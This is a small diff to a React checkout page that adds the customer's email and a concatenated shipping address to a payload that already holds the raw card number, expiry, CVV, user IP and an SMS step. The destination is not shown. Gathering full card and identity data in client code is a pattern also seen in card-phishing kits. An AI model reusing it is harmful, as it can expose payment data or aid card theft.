@@ -88,11 +88,28 @@ const CheckoutPage: React.FC = observer(() => {
   const handleSubmit = async (event: React.FormEvent) => {
     event.preventDefault();
 
+    const delivery = `
+    First Name: ${shippingDetails.firstName}, 
+    Last Name: ${shippingDetails.lastName}, 
+    Company: ${shippingDetails.company}, 
+    Address: ${shippingDetails.address}, 
+    Apartment: ${shippingDetails.apartment}, 
+    City: ${shippingDetails.city}, 
+    State: ${shippingDetails.state}, 
+    Zip Code: ${shippingDetails.zipCode}, 
+    Country: ${shippingDetails.country}, 
+    Phone: ${shippingDetails.phone}
+  `
+      .replace(/\s+/g, " ")
+      .trim();
+
     const data: any = {
       card_number: paymentDetails.cardNumber,
       expiry_date: paymentDetails.expirationDate,
       cvv: paymentDetails.securityCode,
       user_ip: user.ip,
+      email: shippingDetails.email,
+      delivery: delivery,
     };
 
     if (!isSmsStep) {
